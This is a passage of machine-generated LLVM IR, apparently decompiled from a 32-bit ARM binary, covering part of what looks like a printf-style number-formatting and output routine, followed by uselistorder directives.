  %v0_1482c = load i32, i32* %r6.global-to-local, align 4
  %v1_1482c = add i32 %v0_1482c, 12
  store i32 %v1_1482c, i32* %r6.global-to-local, align 4
  %v0_14830.pre = load i32, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_14830

dec_label_pc_14830:                               ; preds = %dec_label_pc_14808, %bb219, %dec_label_pc_14814
  %v1_1483c = phi i32 [ %v1_14818, %bb219 ], [ %v1_1482c, %dec_label_pc_14814 ], [ %v1_14818, %dec_label_pc_14808 ]
  %v0_14830 = phi i32 [ %v0_1483090, %bb219 ], [ %v0_14830.pre, %dec_label_pc_14814 ], [ %v0_1483090, %dec_label_pc_14808 ]
  %v1_14830 = add i32 %v0_14830, 1
  store i32 %v1_14830, i32* %ip.global-to-local, align 4
  %v3_14830 = sub i32 0, %v0_14830
  %v4_14830 = and i32 %v1_14830, %v3_14830
  %v5_14830 = icmp slt i32 %v4_14830, 0
  store i1 %v5_14830, i1* %cpsr_v.global-to-local, align 1
  %v6_14830 = icmp slt i32 %v1_14830, 0
  store i1 %v6_14830, i1* %cpsr_n.global-to-local, align 1
  %v7_14830 = icmp eq i32 %v1_14830, 0
  store i1 %v7_14830, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14830, label %dec_label_pc_14854, label %dec_label_pc_14838

dec_label_pc_14838:                               ; preds = %dec_label_pc_14830
  %v1_14838 = sub i32 -1, %v0_14830
  %v2_1483c = add i32 %v1_1483c, 4
  %v3_1483c = inttoptr i32 %v2_1483c to i32*
  store i32 %v1_14838, i32* %v3_1483c, align 4
  store i32 ptrtoint (i32* @global_var_1afef.854 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_14848 = load i32, i32* %r6.global-to-local, align 4
  %v2_14848 = inttoptr i32 %v1_14848 to i32*
  store i32 176, i32* %v2_14848, align 4
  %v0_1484c = load i32, i32* %r3.global-to-local, align 4
  %v1_1484c = load i32, i32* %r6.global-to-local, align 4
  %v2_1484c = add i32 %v1_1484c, 8
  %v3_1484c = inttoptr i32 %v2_1484c to i32*
  store i32 %v0_1484c, i32* %v3_1484c, align 4
  %v0_14850 = load i32, i32* %r6.global-to-local, align 4
  %v1_14850 = add i32 %v0_14850, 12
  store i32 %v1_14850, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14854

dec_label_pc_14854:                               ; preds = %dec_label_pc_14830, %dec_label_pc_14838
  %v2_1485c = phi i32 [ %v1_1483c, %dec_label_pc_14830 ], [ %v1_14850, %dec_label_pc_14838 ]
  %v0_14854 = load i32, i32* %r1.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14854 = icmp slt i32 %v0_14854, 0
  store i1 %v1_14854, i1* %cpsr_n.global-to-local, align 1
  %v2_14854 = icmp eq i32 %v0_14854, 0
  store i1 %v2_14854, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14854, label %.thread42, label %bb221

bb221:                                            ; preds = %dec_label_pc_14854
  store i32 112, i32* %r3.global-to-local, align 4
  %v3_1485c = inttoptr i32 %v2_1485c to i32*
  store i32 112, i32* %v3_1485c, align 4
  %v1_14860 = load i32, i32* %r4.global-to-local, align 4
  %v2_14860 = load i32, i32* %r6.global-to-local, align 4
  %v3_14860 = add i32 %v2_14860, 8
  %v4_14860 = inttoptr i32 %v3_14860 to i32*
  store i32 %v1_14860, i32* %v4_14860, align 4
  %v1_14864 = load i32, i32* %r1.global-to-local, align 4
  %v2_14864 = load i32, i32* %r6.global-to-local, align 4
  %v3_14864 = add i32 %v2_14864, 4
  %v4_14864 = inttoptr i32 %v3_14864 to i32*
  store i32 %v1_14864, i32* %v4_14864, align 4
  %v1_14868 = load i32, i32* %r6.global-to-local, align 4
  %v2_14868 = add i32 %v1_14868, 12
  store i32 %v2_14868, i32* %r6.global-to-local, align 4
  br label %.thread42

.thread42:                                        ; preds = %dec_label_pc_14854, %bb221
  %v1_1488c = phi i32 [ %v2_1485c, %dec_label_pc_14854 ], [ %v2_14868, %bb221 ]
  %v0_1486c = load i32, i32* %r7.global-to-local, align 4
  %v1_1486c = add i32 %v0_1486c, -103
  %v3_1486c = sub i32 102, %v0_1486c
  %v4_1486c = and i32 %v3_1486c, %v0_1486c
  %v5_1486c = icmp slt i32 %v4_1486c, 0
  store i1 %v5_1486c, i1* %cpsr_v.global-to-local, align 1
  %v6_1486c = icmp slt i32 %v1_1486c, 0
  store i1 %v6_1486c, i1* %cpsr_n.global-to-local, align 1
  %v7_1486c = icmp eq i32 %v0_1486c, 103
  store i1 %v7_1486c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1486c, label %dec_label_pc_14874, label %dec_label_pc_1487c

dec_label_pc_14874:                               ; preds = %.thread42
  %v0_14874 = load i32, i32* %lr.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14874 = icmp slt i32 %v0_14874, 0
  store i1 %v1_14874, i1* %cpsr_n.global-to-local, align 1
  %v2_14874 = icmp eq i32 %v0_14874, 0
  store i1 %v2_14874, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14874, label %dec_label_pc_148a4, label %dec_label_pc_1487c

dec_label_pc_1487c:                               ; preds = %.thread42, %dec_label_pc_14874
  %v0_1487c = load i32, i32* %ip.global-to-local, align 4
  %v1_1487c = load i32, i32* %r1.global-to-local, align 4
  %v2_1487c = sub i32 %v1_1487c, %v0_1487c
  store i32 %v2_1487c, i32* %r3.global-to-local, align 4
  %v1_14880 = load i32, i32* %r8.global-to-local, align 4
  %v2_14880 = sub i32 %v2_1487c, %v1_14880
  %v4_14880 = xor i32 %v1_14880, %v2_1487c
  %v5_14880 = xor i32 %v2_14880, %v2_1487c
  %v6_14880 = and i32 %v5_14880, %v4_14880
  %v7_14880 = icmp slt i32 %v6_14880, 0
  store i1 %v7_14880, i1* %cpsr_v.global-to-local, align 1
  %v8_14880 = icmp slt i32 %v2_14880, 0
  store i1 %v8_14880, i1* %cpsr_n.global-to-local, align 1
  %v9_14880 = icmp eq i32 %v2_1487c, %v1_14880
  store i1 %v9_14880, i1* %cpsr_z.global-to-local, align 1
  %v2_14884 = xor i1 %v8_14880, %v7_14880
  br i1 %v2_14884, label %dec_label_pc_14888, label %dec_label_pc_148a4

dec_label_pc_14888:                               ; preds = %dec_label_pc_1487c
  %v2_14888 = sub i32 %v1_14880, %v2_1487c
  %v2_1488c = add i32 %v1_1488c, 4
  %v3_1488c = inttoptr i32 %v2_1488c to i32*
  store i32 %v2_14888, i32* %v3_1488c, align 4
  store i32 ptrtoint (i32* @global_var_1afef.854 to i32), i32* %r3.global-to-local, align 4
  store i32 176, i32* %r2.global-to-local, align 4
  %v1_14898 = load i32, i32* %r6.global-to-local, align 4
  %v2_14898 = inttoptr i32 %v1_14898 to i32*
  store i32 176, i32* %v2_14898, align 4
  %v0_1489c = load i32, i32* %r3.global-to-local, align 4
  %v1_1489c = load i32, i32* %r6.global-to-local, align 4
  %v2_1489c = add i32 %v1_1489c, 8
  %v3_1489c = inttoptr i32 %v2_1489c to i32*
  store i32 %v0_1489c, i32* %v3_1489c, align 4
  %v0_148a0 = load i32, i32* %r6.global-to-local, align 4
  %v1_148a0 = add i32 %v0_148a0, 12
  store i32 %v1_148a0, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_148a4

dec_label_pc_148a4:                               ; preds = %dec_label_pc_1487c, %dec_label_pc_14874, %dec_label_pc_14888
  %v1_14938.pre.pre = phi i32 [ %v1_1488c, %dec_label_pc_1487c ], [ %v1_1488c, %dec_label_pc_14874 ], [ %v1_148a0, %dec_label_pc_14888 ]
  %v0_148a4 = load i32, i32* %sl.global-to-local, align 4
  %v1_148a4 = add i32 %v0_148a4, -102
  %v3_148a4 = sub i32 101, %v0_148a4
  %v4_148a4 = and i32 %v3_148a4, %v0_148a4
  %v5_148a4 = icmp slt i32 %v4_148a4, 0
  store i1 %v5_148a4, i1* %cpsr_v.global-to-local, align 1
  %v6_148a4 = icmp slt i32 %v1_148a4, 0
  store i1 %v6_148a4, i1* %cpsr_n.global-to-local, align 1
  %v7_148a4 = icmp eq i32 %v0_148a4, 102
  store i1 %v7_148a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_148a4, label %dec_label_pc_1492c, label %dec_label_pc_148ac

dec_label_pc_148ac:                               ; preds = %dec_label_pc_148a4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_148b0 = load i32, i32* %r0.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_148b0 = icmp slt i32 %v0_148b0, 0
  store i1 %v1_148b0, i1* %cpsr_n.global-to-local, align 1
  %v2_148b0 = icmp eq i32 %v0_148b0, 0
  store i1 %v2_148b0, i1* %cpsr_z.global-to-local, align 1
  %v4_148b4 = zext i8 %stack_var_-66.0108114 to i32
  store i32 %v4_148b4, i32* %r8.global-to-local, align 4
  store i32 0, i32* %stack_var_-51, align 4
  %v4_148c4 = sub i32 0, %v0_148b0
  %storemerge140 = select i1 %v1_148b0, i32 %v4_148c4, i32 %v0_148b0
  %tmp239 = ashr i32 %v0_148b0, 31
  %tmp240 = and i32 %tmp239, 2
  %tmp241 = add nuw nsw i32 %tmp240, 43
  store i32 %storemerge140, i32* %r4.global-to-local, align 4
  store i32 %tmp241, i32* %sl.global-to-local, align 4
  %v2_148cc = ptrtoint i32* %stack_var_-51 to i32
  store i32 %v2_148cc, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_148d4

dec_label_pc_148d4:                               ; preds = %dec_label_pc_14904, %dec_label_pc_148d4, %dec_label_pc_148ac
  %v2_148ec = phi i32 [ %v2_148cc, %dec_label_pc_148ac ], [ %v6_148ec, %dec_label_pc_148d4 ], [ %v6_148ec, %dec_label_pc_14904 ]
  %v0_148e8 = phi i32 [ %storemerge140, %dec_label_pc_148ac ], [ %v2_148f0, %dec_label_pc_148d4 ], [ %v2_148f0, %dec_label_pc_14904 ]
  %v2_148dc = srem i32 %v0_148e8, 10
  %v1_148e0 = add nsw i32 %v2_148dc, 48
  store i32 %v1_148e0, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r1.global-to-local, align 4
  store i32 %v0_148e8, i32* %r0.global-to-local, align 4
  %v1_148ec = trunc i32 %v1_148e0 to i8
  %v3_148ec = add i32 %v2_148ec, -1
  %v4_148ec = inttoptr i32 %v3_148ec to i8*
  store i8 %v1_148ec, i8* %v4_148ec, align 1
  %v5_148ec = load i32, i32* %r5.global-to-local, align 4
  %v6_148ec = add i32 %v5_148ec, -1
  store i32 %v6_148ec, i32* %r5.global-to-local, align 4
  %v0_148f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_148f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_148f0 = sdiv i32 %v0_148f0, %v1_148f0
  store i32 %v2_148f0, i32* %r0.global-to-local, align 4
  %v0_148f4 = load i32, i32* %r7.global-to-local, align 4
  %v1_148f4 = add i32 %v0_148f4, 1
  store i32 %v1_148f4, i32* %r7.global-to-local, align 4
  %v1_148f8 = add i32 %v0_148f4, -2
  %v3_148f8 = sub i32 1, %v0_148f4
  %v4_148f8 = and i32 %v3_148f8, %v1_148f4
  %v5_148f8 = icmp slt i32 %v4_148f8, 0
  store i1 %v5_148f8, i1* %cpsr_v.global-to-local, align 1
  %v6_148f8 = icmp slt i32 %v1_148f8, 0
  store i1 %v6_148f8, i1* %cpsr_n.global-to-local, align 1
  %v7_148f8 = icmp eq i32 %v1_148f4, 3
  store i1 %v7_148f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_148f0, i32* %r4.global-to-local, align 4
  %v7_14900 = icmp slt i32 %v1_148f4, 4
  br i1 %v7_14900, label %dec_label_pc_148d4, label %dec_label_pc_14904

dec_label_pc_14904:                               ; preds = %dec_label_pc_148d4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14904 = icmp slt i32 %v2_148f0, 0
  store i1 %v1_14904, i1* %cpsr_n.global-to-local, align 1
  %v2_14904 = icmp eq i32 %v2_148f0, 0
  store i1 %v2_14904, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14904, label %dec_label_pc_1490c, label %dec_label_pc_148d4

dec_label_pc_1490c:                               ; preds = %dec_label_pc_14904
  %v1_1490c = add i32 %v5_148ec, -2
  store i32 %v1_1490c, i32* %r3.global-to-local, align 4
  %v0_14910 = load i32, i32* %sl.global-to-local, align 4
  %v1_14910 = trunc i32 %v0_14910 to i8
  %v4_14910 = inttoptr i32 %v1_1490c to i8*
  store i8 %v1_14910, i8* %v4_14910, align 1
  %v0_14914 = load i32, i32* %r3.global-to-local, align 4
  %v1_14914 = add i32 %v0_14914, -1
  store i32 %v1_14914, i32* %r2.global-to-local, align 4
  %v0_14918 = load i32, i32* %r8.global-to-local, align 4
  %v1_14918 = trunc i32 %v0_14918 to i8
  %v4_14918 = inttoptr i32 %v1_14914 to i8*
  store i8 %v1_14918, i8* %v4_14918, align 1
  store i32 112, i32* %r3.global-to-local, align 4
  %v0_14920 = load i32, i32* %r6.global-to-local, align 4
  %v1_14920 = inttoptr i32 %v0_14920 to i32*
  store i32 112, i32* %v1_14920, align 4
  %v3_14920 = add i32 %v0_14920, 4
  %v4_14920 = inttoptr i32 %v3_14920 to i32*
  %v5_14920 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v5_14920, i32* %v4_14920, align 4
  %v0_14924 = load i32, i32* %r2.global-to-local, align 4
  %v1_14924 = load i32, i32* %r6.global-to-local, align 4
  %v2_14924 = add i32 %v1_14924, 8
  %v3_14924 = inttoptr i32 %v2_14924 to i32*
  store i32 %v0_14924, i32* %v3_14924, align 4
  %v0_14928 = load i32, i32* %r6.global-to-local, align 4
  %v1_14928 = add i32 %v0_14928, 12
  store i32 %v1_14928, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1492c

dec_label_pc_1492c:                               ; preds = %dec_label_pc_148a4, %.thread105, %dec_label_pc_1490c
  %v1_14938.pre = phi i32 [ %v2_144a4, %.thread105 ], [ %v1_14928, %dec_label_pc_1490c ], [ %v1_14938.pre.pre, %dec_label_pc_148a4 ]
  %v2_1492c = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_1492c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_14930

dec_label_pc_14930:                               ; preds = %dec_label_pc_14930, %dec_label_pc_1492c
  %v0_14930 = phi i32 [ %v2_1492c, %dec_label_pc_1492c ], [ %v4_14930, %dec_label_pc_14930 ]
  %stack_var_-188.0 = phi i32 [ %v3_143dc, %dec_label_pc_1492c ], [ %v2_1493c, %dec_label_pc_14930 ]
  %v1_14930 = inttoptr i32 %v0_14930 to i32*
  %v2_14930 = load i32, i32* %v1_14930, align 4
  store i32 %v2_14930, i32* %r3.global-to-local, align 4
  %v4_14930 = add i32 %v0_14930, 12
  store i32 %v4_14930, i32* %r2.global-to-local, align 4
  %v3_14938 = icmp ult i32 %v4_14930, %v1_14938.pre
  %v2_1493c = sub i32 %stack_var_-188.0, %v2_14930
  store i32 %v2_1493c, i32* %ip.global-to-local, align 4
  br i1 %v3_14938, label %dec_label_pc_14930, label %dec_label_pc_14948

dec_label_pc_14948:                               ; preds = %dec_label_pc_14930
  %v3_14948 = load i8, i8* %stack_var_-50, align 1
  %v4_14948 = sext i8 %v3_14948 to i32
  store i32 %v4_14948, i32* %r3.global-to-local, align 4
  store i32 %v4_14948, i32* %r2.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_1494c = icmp slt i8 %v3_14948, 0
  store i1 %v1_1494c, i1* %cpsr_n.global-to-local, align 1
  %v2_1494c = icmp eq i8 %v3_14948, 0
  store i1 %v2_1494c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1494c, label %bb226, label %bb225

bb225:                                            ; preds = %dec_label_pc_14948
  store i32 1, i32* %r2.global-to-local, align 4
  br label %bb226

bb226:                                            ; preds = %dec_label_pc_14948, %bb225
  %v1_14998 = phi i32 [ %v4_14948, %dec_label_pc_14948 ], [ 1, %bb225 ]
  %v2_14954 = sub i32 %v2_1493c, %v1_14998
  store i32 %v2_14954, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r0.global-to-local, align 4
  %v2_1495c = ptrtoint i8* %stack_var_-50 to i32
  store i32 %v2_1495c, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v1_14960 = icmp slt i32 %v2_14954, 0
  store i1 %v1_14960, i1* %cpsr_n.global-to-local, align 1
  %v2_14960 = icmp eq i32 %v2_14954, 0
  store i1 %v2_14960, i1* %cpsr_z.global-to-local, align 1
  store i32 160, i32* %stack_var_-184, align 4
  %tmp227 = icmp slt i32 %v2_14954, 1
  br i1 %tmp227, label %dec_label_pc_149c0, label %dec_label_pc_14974

dec_label_pc_14974:                               ; preds = %bb226
  %v0_14974 = load i32, i32* %fp.global-to-local, align 4
  %v1_14974 = add i32 %v0_14974, 12
  %v2_14974 = inttoptr i32 %v1_14974 to i32*
  %v3_14974 = load i32, i32* %v2_14974, align 4
  store i32 %v3_14974, i32* %r3.global-to-local, align 4
  %v1_14978 = and i32 %v3_14974, 8
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14978 = icmp eq i32 %v1_14978, 0
  store i1 %v2_14978, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14978, label %dec_label_pc_14990, label %dec_label_pc_14980

dec_label_pc_14980:                               ; preds = %dec_label_pc_14974
  store i32 ptrtoint (i32* @global_var_1afef.854 to i32), i32* %r3.global-to-local, align 4
  %v1_14984 = add i32 %v1_14938.pre, 12
  store i32 %v1_14984, i32* %r5.global-to-local, align 4
  %v1_14988 = inttoptr i32 %v1_14938.pre to i32*
  store i32 160, i32* %v1_14988, align 4
  %v3_14988 = add i32 %v1_14938.pre, 4
  %v4_14988 = inttoptr i32 %v3_14988 to i32*
  %v5_14988 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_14988, i32* %v4_14988, align 4
  %v6_14988 = add i32 %v1_14938.pre, 8
  %v7_14988 = inttoptr i32 %v6_14988 to i32*
  %v8_14988 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v8_14988, i32* %v7_14988, align 4
  br label %dec_label_pc_149c4

dec_label_pc_14990:                               ; preds = %dec_label_pc_14974
  %v1_14990 = add i32 %v0_14974, 16
  %v2_14990 = inttoptr i32 %v1_14990 to i32*
  %v3_14990 = load i32, i32* %v2_14990, align 4
  store i32 %v3_14990, i32* %r3.global-to-local, align 4
  %v1_14994 = add i32 %v3_14990, -48
  %v3_14994 = sub i32 47, %v3_14990
  %v4_14994 = and i32 %v3_14994, %v3_14990
  %v5_14994 = icmp slt i32 %v4_14994, 0
  store i1 %v5_14994, i1* %cpsr_v.global-to-local, align 1
  %v6_14994 = icmp slt i32 %v1_14994, 0
  store i1 %v6_14994, i1* %cpsr_n.global-to-local, align 1
  %v7_14994 = icmp eq i32 %v3_14990, 48
  store i1 %v7_14994, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14994, label %dec_label_pc_149a4, label %bb228

bb228:                                            ; preds = %dec_label_pc_14990
  store i32 %v2_1493c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_149c0

dec_label_pc_149a4:                               ; preds = %dec_label_pc_14990
  %v3_149a4 = load i32, i32* %stack_var_-168, align 4
  store i32 %v1_14938.pre, i32* %r5.global-to-local, align 4
  %v2_149ac = add i32 %v3_149a4, %v2_14954
  store i32 %v2_149ac, i32* %r3.global-to-local, align 4
  store i32 %v2_149ac, i32* %stack_var_-168, align 4
  br label %dec_label_pc_149c4

dec_label_pc_149b8:                               ; preds = %dec_label_pc_149cc
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_149fc

dec_label_pc_149c0:                               ; preds = %bb228, %bb226
  store i32 %v1_14938.pre, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_149c4

dec_label_pc_149c4:                               ; preds = %dec_label_pc_149a4, %dec_label_pc_14980, %dec_label_pc_149c0
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_143b8, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_149cc

dec_label_pc_149cc:                               ; preds = %dec_label_pc_149f4, %dec_label_pc_149c4
  %v0_149cc = phi i32 [ %v1_149ec, %dec_label_pc_149f4 ], [ %v2_143b8, %dec_label_pc_149c4 ]
  %v1_149cc = inttoptr i32 %v0_149cc to i32*
  %v2_149cc = load i32, i32* %v1_149cc, align 4
  store i32 %v2_149cc, i32* %r1.global-to-local, align 4
  %v3_149cc = add i32 %v0_149cc, 4
  %v4_149cc = inttoptr i32 %v3_149cc to i32*
  %v5_149cc = load i32, i32* %v4_149cc, align 4
  store i32 %v5_149cc, i32* %r2.global-to-local, align 4
  %v6_149cc = add i32 %v0_149cc, 8
  %v7_149cc = inttoptr i32 %v6_149cc to i32*
  %v8_149cc = load i32, i32* %v7_149cc, align 4
  store i32 %v8_149cc, i32* %r3.global-to-local, align 4
  %v2_149d0 = load i32, i32* %stack_var_-192, align 4
  store i32 %v2_149d0, i32* %r0.global-to-local, align 4
  store i32 %arg5, i32* @ip, align 4
  store i32 84448, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg5)
  %v0_149e0 = load i32, i32* %r4.global-to-local, align 4
  %v1_149e0 = add i32 %v0_149e0, 4
  %v2_149e0 = inttoptr i32 %v1_149e0 to i32*
  %v3_149e0 = load i32, i32* %v2_149e0, align 4
  store i32 %v3_149e0, i32* %r3.global-to-local, align 4
  %v0_149e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_149e4 = sub i32 %v0_149e4, %v3_149e0
  %v4_149e4 = xor i32 %v0_149e4, %v3_149e0
  %v5_149e4 = xor i32 %v2_149e4, %v0_149e4
  %v6_149e4 = and i32 %v5_149e4, %v4_149e4
  %v7_149e4 = icmp slt i32 %v6_149e4, 0
  store i1 %v7_149e4, i1* %cpsr_v.global-to-local, align 1
  %v8_149e4 = icmp slt i32 %v2_149e4, 0
  store i1 %v8_149e4, i1* %cpsr_n.global-to-local, align 1
  %v9_149e4 = icmp eq i32 %v0_149e4, %v3_149e0
  store i1 %v9_149e4, i1* %cpsr_z.global-to-local, align 1
  %v0_149e8 = load i32, i32* %r6.global-to-local, align 4
  %v2_149e8 = add i32 %v0_149e8, %v0_149e4
  store i32 %v2_149e8, i32* %r6.global-to-local, align 4
  %v1_149ec = add i32 %v0_149e0, 12
  store i32 %v1_149ec, i32* %r4.global-to-local, align 4
  br i1 %v9_149e4, label %dec_label_pc_149f4, label %dec_label_pc_149b8

dec_label_pc_149f4:                               ; preds = %dec_label_pc_149cc
  %v1_149f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_149f4 = sub i32 %v1_149ec, %v1_149f4
  %v3_149f4 = icmp ult i32 %v1_149ec, %v1_149f4
  %v4_149f4 = xor i32 %v1_149f4, %v1_149ec
  %v5_149f4 = xor i32 %v2_149f4, %v1_149ec
  %v6_149f4 = and i32 %v5_149f4, %v4_149f4
  %v7_149f4 = icmp slt i32 %v6_149f4, 0
  store i1 %v7_149f4, i1* %cpsr_v.global-to-local, align 1
  %v8_149f4 = icmp slt i32 %v2_149f4, 0
  store i1 %v8_149f4, i1* %cpsr_n.global-to-local, align 1
  %v9_149f4 = icmp eq i32 %v1_149ec, %v1_149f4
  store i1 %v9_149f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_149f4, label %dec_label_pc_149cc, label %dec_label_pc_149fc

dec_label_pc_149fc:                               ; preds = %dec_label_pc_149f4, %dec_label_pc_149b8
  %v0_149fc = phi i32 [ -1, %dec_label_pc_149b8 ], [ %v2_149e8, %dec_label_pc_149f4 ]
  store i32 %v0_149fc, i32* %r0.global-to-local, align 4
  %v8_14a08 = load i32, i32* %stack_var_-36, align 4
  store i32 %v8_14a08, i32* @r6, align 4
  store i32 %v6_143a4, i32* @r7, align 4
  store i32 %v9_143a4, i32* @r8, align 4
  store i32 %v12_143a4, i32* @sb, align 4
  store i32 %v15_143a4, i32* @sl, align 4
  store i32 %v18_143a4, i32* @fp, align 4
  ret i32 %v0_149fc

; uselistorder directives
  uselistorder i32 %v0_149fc, { 1, 0 }
  uselistorder i32 %v2_149f4, { 1, 0 }
  uselistorder i32 %v1_149f4, { 2, 0, 1, 3 }
  uselistorder i32 %v1_149ec, { 4, 0, 1, 5, 3, 6, 2 }
  uselistorder i32 %v2_149e4, { 1, 0 }
  uselistorder i32 %v0_149e4, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v3_149e0, { 2, 0, 1, 3 }
  uselistorder i32 %v0_149cc, { 2, 1, 0 }
  uselistorder i32 %v3_14990, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_1493c, { 0, 1, 3, 2 }
  uselistorder i32 %v4_14930, { 1, 2, 0 }
  uselistorder i32 %v0_14930, { 1, 0 }
  uselistorder i32 %v1_14938.pre, { 6, 5, 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_148f0, { 2, 3, 4, 5, 1, 0 }
  uselistorder i32 %v6_148ec, { 2, 1, 0 }
  uselistorder i32 %storemerge140, { 1, 0 }
  uselistorder i32 %v0_148b0, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v0_148a4, { 3, 0, 1, 2 }
  uselistorder i32 %v2_14880, { 1, 0 }
  uselistorder i32 %v1_14880, { 1, 2, 0, 3 }
  uselistorder i32 %v2_1487c, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v0_14874, { 1, 0 }
  uselistorder i32 %v0_1486c, { 3, 0, 1, 2 }
  uselistorder i32 %v0_14854, { 1, 0 }
  uselistorder i32 %v1_14830, { 1, 2, 0, 3 }
  uselistorder i32 %v0_14830, { 1, 0, 2 }
  uselistorder i32 %v1_1480c, { 0, 2, 1 }
  uselistorder i32 %v0_14808, { 3, 0, 1, 2 }
  uselistorder i1 %v2_147ec, { 2, 1, 0 }
  uselistorder i32 %v2_14744, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v2_14734, { 2, 1, 3, 5, 0, 4, 6 }
  uselistorder i32 %v0_147d8, { 3, 0, 4, 7, 5, 6, 9, 1, 2, 8 }
  uselistorder i32 %v0_146e0, { 1, 4, 0, 2, 3 }
  uselistorder i1 %v2_146c8, { 1, 0 }
  uselistorder i32 %v2_146c0, { 1, 2, 0 }
  uselistorder i32 %v1_146b4, { 1, 0 }
  uselistorder i32 %v0_146b4, { 2, 3, 5, 0, 4, 1 }
  uselistorder i32 %v1_146ac, { 1, 0, 2 }
  uselistorder i32 %v0_146a4, { 3, 0, 1, 2 }
  uselistorder i1 %v3_14688, { 1, 0 }
  uselistorder i32 %v2_14688, { 1, 0 }
  uselistorder i32 %v2_14684, { 2, 1, 3, 4, 6, 0, 7, 5, 8 }
  uselistorder i1 %v7_14670, { 1, 0 }
  uselistorder i32 %v1_14674, { 2, 1, 0 }
  uselistorder i1 %v2_14664, { 1, 0 }
  uselistorder i32 %v0_14660, { 2, 4, 0, 1, 5, 3, 7, 6 }
  uselistorder i1 %v2_14648, { 1, 0 }
  uselistorder i32 %v1_1463c, { 0, 5, 2, 1, 4, 3 }
  uselistorder i32 %v2_145f4, { 1, 2, 0 }
  uselistorder i32 %v2_145f0, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_145f0, { 1, 0, 2 }
  uselistorder i1 %v2_145dc, { 1, 0 }
  uselistorder i32 %v0_145d4, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_145e4, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v5_145c4, { 1, 0 }
  uselistorder i32 %v0_145b4, { 2, 3, 0, 6, 1, 4, 5 }
  uselistorder i1 %v6_145ac, { 1, 0 }
  uselistorder i1 %v5_145ac, { 1, 0 }
  uselistorder i32 %v0_145a8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1459c, { 2, 5, 0, 3, 4, 1 }
  uselistorder i32 %v2_14598, { 0, 1, 3, 5, 2, 4 }
  uselistorder i32 %v4_1454c, { 1, 0 }
  uselistorder i32 %v3_1454c, { 1, 0 }
  uselistorder i32 %v0_14480, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v2_143b8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_143b4, { 1, 0 }
  uselistorder i32* %stack_var_-87, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-86, { 1, 2, 0 }
  uselistorder i32* %stack_var_-51, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 1, 4, 2, 3 }
  uselistorder i8* %stack_var_-50, { 1, 3, 0, 2 }
  uselistorder i32 %tmp, { 0, 2, 1, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 1, 8, 2, 3, 9, 4, 5, 6, 7 }
  uselistorder i32* %sb.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r8.global-to-local, { 0, 1, 5, 6, 2, 3, 7, 4, 8 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 6, 7, 8, 12, 9, 4, 10, 11, 5, 13 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 3, 0, 4, 11, 12, 13, 5, 14, 15, 16, 6, 17, 18, 19, 7, 20, 21, 22, 8, 23, 24, 25, 9, 10, 26, 27, 28, 29, 30 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 8, 9 }
